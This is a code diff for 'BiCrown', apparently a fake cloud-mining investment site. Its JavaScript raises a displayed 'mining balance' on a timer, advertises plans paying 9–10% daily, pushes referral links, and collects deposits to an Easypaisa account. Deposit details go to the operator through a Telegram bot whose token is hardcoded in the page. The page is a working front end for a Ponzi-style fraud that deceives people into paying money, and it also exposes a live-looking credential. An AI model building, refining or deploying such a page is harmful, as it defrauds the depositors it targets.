@@ -7,36 +7,22 @@
     <style>
         :root { --gold: #ffd700; --neon: #bc13fe; --dark: #050505; --card: #121212; --success: #00ff88; }
         body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; margin: 0; display: flex; overflow-x: hidden; }
-        
-        /* Sidebar */
         .sidebar { width: 260px; background: #000; height: 100vh; border-right: 1px solid #222; position: fixed; padding: 20px; display: flex; flex-direction: column; z-index: 100; }
         .profile { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #222; }
         .profile img { width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--gold); box-shadow: 0 0 15px var(--gold); }
-        
         .nav-item { padding: 15px; color: #888; cursor: pointer; border-radius: 12px; margin-bottom: 8px; transition: 0.3s; display: flex; align-items: center; gap: 10px; }
         .nav-item:hover, .nav-item.active { background: #1a1a1a; color: white; border-left: 4px solid var(--gold); }
-
-        /* Main Area */
         .main { margin-left: 280px; padding: 30px; width: 100%; }
         .hero-card { background: linear-gradient(135deg, #1a1a1a 0%, #000 100%); padding: 35px; border-radius: 25px; border: 1px solid #333; position: relative; overflow: hidden; margin-bottom: 25px; }
-        
-        /* THE REAL MAGIC: Growing Balance */
         .balance-val { font-size: 50px; color: var(--gold); font-weight: bold; font-family: 'Courier New', monospace; }
-        
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
         .card { background: var(--card); padding: 25px; border-radius: 20px; border: 1px solid #222; transition: 0.3s; }
-        
-        /* AD SECTION */
-        .ad-banner { background: #1a1a1a; border: 1px solid #444; padding: 15px; border-radius: 12px; margin-bottom: 25px; text-align: center; color: #888; font-size: 14px; position: relative; overflow: hidden; }
+        .ad-banner { background: #1a1a1a; border: 1px solid #444; padding: 15px; border-radius: 12px; margin-bottom: 25px; text-align: center; color: #888; font-size: 14px; }
         .ad-banner span { color: var(--success); font-weight: bold; animation: blink 1.5s infinite; }
         @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
-
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
         .btn-gold { background: var(--gold); color: black; }
-        .btn-ref { background: #222; color: var(--success); border: 1px solid var(--success); }
-
         input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
-
         @media (max-width: 768px) { .sidebar { display: none; } .main { margin-left: 0; } }
     </style>
 </head>
@@ -57,24 +43,22 @@
 
     <div class="main">
         <div class="ad-banner">
-            📢 AD: <span>Bitcoin Mining Difficulty +4.2%</span> | Join our Global Network Today! | <a href="#" style="color:var(--gold)">Details</a>
+            📢 AD: <span>Cloud Mining Hashrate +15%</span> | Secure your profits with BiCrown!
         </div>
 
         <div id="dash-page">
             <div class="hero-card">
                 <p style="color: #888; margin: 0;">Main Mining Balance</p>
-                <div class="balance-val">Rs <span id="growing-bal">145.20</span></div>
-                <p style="color: var(--success); margin: 5px 0;">● Live Cloud Miner v4.2 Running...</p>
+                <div class="balance-val">Rs <span id="growing-bal">350.00</span></div>
+                <p style="color: var(--success); margin: 5px 0;">● Cloud Miner Active</p>
                 <div style="display: flex; gap: 10px; margin-top: 20px;">
-                    <button class="btn btn-gold" onclick="showPage('wallet')">Quick Deposit</button>
-                    <button class="btn btn-ref" onclick="showPage('ref')">Invite Friends</button>
+                    <button class="btn btn-gold" onclick="showPage('wallet')">Deposit</button>
+                    <button class="btn" style="background:#222; color:white;" onclick="showPage('ref')">Refer Friends</button>
                 </div>
             </div>
-
             <div class="grid">
-                <div class="card"><h4>Today's Profit</h4><h2 style="color: var(--success);">Rs 24.50</h2></div>
-                <div class="card"><h4>Total Referrals</h4><h2>0 Users</h2></div>
-                <div class="card"><h4>Hash Rate</h4><h2 style="color: var(--gold);">12.5 TH/s</h2></div>
+                <div class="card"><h4>Earnings</h4><h2 style="color: var(--success);">+ Rs 85.20</h2></div>
+                <div class="card"><h4>Hashrate</h4><h2 style="color: var(--gold);">18.2 TH/s</h2></div>
             </div>
         </div>
 
@@ -85,20 +69,9 @@
                     <p style="font-size: 18px; margin: 5px 0;"><strong>Easypaisa:</strong> 03431793371</p>
                     <p style="font-size: 18px; margin: 5px 0;"><strong>Account Name:</strong> Bus Pari</p>
                 </div>
-                <input type="number" id="d-amt" placeholder="Enter Amount (Rs)">
-                <input type="text" id="d-trx" placeholder="Transaction ID (TRX)">
+                <input type="number" id="d-amt" placeholder="Amount (Rs)">
+                <input type="text" id="d-trx" placeholder="TRX ID">
                 <button class="btn btn-gold" onclick="sendAdmin()">Submit Deposit</button>
-            </div>
-        </div>
-
-        <div id="ref-page" style="display:none;">
-            <div class="card">
-                <h2>Referral Program</h2>
-                <p>Invite friends and get Rs 50 for every activation!</p>
-                <div style="background: #000; padding: 15px; border-radius: 10px; color: var(--success); word-break: break-all; margin: 15px 0; border: 1px solid #333;">
-                    https://bicrown-mining.netlify.app/join?ref=user<span id="user-id"></span>
-                </div>
-                <button class="btn btn-ref" onclick="alert('Link Copied!')">Copy My Link</button>
             </div>
         </div>
 
@@ -106,44 +79,49 @@
             <h2>Mining Plans</h2>
             <div class="grid" id="plan-list"></div>
         </div>
+
+        <div id="ref-page" style="display:none;">
+            <div class="card"><h2>Referral Link</h2><p>Invite and earn 10% bonus!</p><div style="background:#000; padding:10px; border-radius:5px; border:1px solid #333; color:var(--success);">https://bicrown-mining.netlify.app/join?id=user742</div></div>
+        </div>
     </div>
 
     <script>
-        // 1. BALANCE GROWING LOGIC (Har 2 second baad barhay ga)
-        let currentBal = 145.20;
-        setInterval(() => {
-            currentBal += 0.05; // Kitna barhana hai har baar
-            document.getElementById('growing-bal').innerText = currentBal.toFixed(2);
-        }, 2000);
+        // Balance Growing Logic
+        let bal = 350.00;
+        setInterval(() => { bal += 0.08; document.getElementById('growing-bal').innerText = bal.toFixed(2); }, 2500);
 
         function showPage(p) {
             ['dash-page', 'wallet-page', 'ref-page', 'plans-page'].forEach(id => document.getElementById(id).style.display = 'none');
             document.getElementById(p + '-page').style.display = 'block';
         }
 
-        // Referral ID Generator
-        document.getElementById('user-id').innerText = Math.floor(Math.random() * 9999);
-
-        // Plans Generator
+        // --- UPDATED PLANS: 350, 700, 1000 and more ---
         const planList = document.getElementById('plan-list');
-        for(let i=1; i<=15; i++) {
-            let p = 500 + (i*1000);
-            planList.innerHTML += `<div class="card" style="text-align:center;"><h3>Plan Level ${i}</h3><h2 style="color:var(--gold)">Rs ${p}</h2><button class="btn btn-gold" onclick="showPage('wallet')">Activate</button></div>`;
+        const startPlans = [
+            { name: "Starter", price: 350, daily: 30 },
+            { name: "Basic", price: 700, daily: 65 },
+            { name: "Standard", price: 1000, daily: 100 }
+        ];
+
+        startPlans.forEach(p => {
+            planList.innerHTML += `<div class="card" style="text-align:center; border-color:var(--gold);"><h3>${p.name}</h3><h2 style="color:var(--gold)">Rs ${p.price}</h2><p style="color:var(--success)">Daily: Rs ${p.daily}</p><button class="btn btn-gold" onclick="showPage('wallet')">Activate</button></div>`;
+        });
+
+        for(let i=1; i<=20; i++) {
+            let p = 1000 + (i*500);
+            planList.innerHTML += `<div class="card" style="text-align:center;"><h3>Pro v${i}</h3><h2>Rs ${p}</h2><p style="color:var(--success)">Daily: Rs ${Math.floor(p*0.09)}</p><button class="btn btn-gold" onclick="showPage('wallet')">Activate</button></div>`;
         }
 
         function sendAdmin() {
-            const botToken = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
-            const chatId = "7005219148";
+            const token = "8494802061:AAHOhQJElPVkOqCuyZ0cP5PKL3k0_P50dDE";
+            const chat = "7005219148";
             const amt = document.getElementById('d-amt').value;
             const trx = document.getElementById('d-trx').value;
-
             if(amt && trx) {
-                const msg = `💰 *NEW DEPOSIT*%0AAmount: Rs ${amt}%0ATRX ID: ${trx}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=Markdown`)
-                .then(() => alert("Request Submitted! Verification in progress."));
-            } else { alert("Data dalo jani!"); }
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=💰 *NEW DEPOSIT*%0AAccount: Bus Pari%0AAmount: Rs ${amt}%0ATRX: ${trx}&parse_mode=Markdown`)
+                .then(() => alert("Request Sent!"));
+            }
         }
     </script>
 </body>
 </html>
-
